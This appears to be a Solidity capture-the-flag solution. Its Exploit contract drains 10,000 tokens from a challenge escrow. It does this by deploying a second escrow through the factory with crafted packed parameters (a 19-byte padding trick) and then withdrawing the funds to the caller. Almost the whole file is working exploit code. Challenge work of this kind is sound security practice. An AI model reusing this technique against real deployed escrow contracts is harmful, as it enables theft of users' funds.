// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import { Setup, DualAssetEscrow } from "src/escrow/Setup.sol";
import {Test, console} from "forge-std/Test.sol";

contract Exploit {
    Setup setup;
    address public escrow;
    uint256 public escrowId;
   constructor(Setup _setup) {
        setup = _setup;
    }

    function solve() external {
        setup.claim();
        setup.grey().approve(address(setup.escrow()), type(uint256).max);
       // DualAssetEscrow(setup.escrow()).withdraw(false,0);

        console.log(setup.grey().balanceOf(address(setup.escrow())));
       (escrowId, escrow) = setup.factory().deployEscrow(
            0,  // implId = 0
            abi.encodePacked(address(setup.grey()), new bytes(19)) //  // tokenY = ETH with 19-byte optimization
        );
        DualAssetEscrow(setup.escrow()).withdraw(true, 10_000e18);
        setup.grey().transfer(msg.sender,10_000e18);
        console.log(escrowId);
    }
}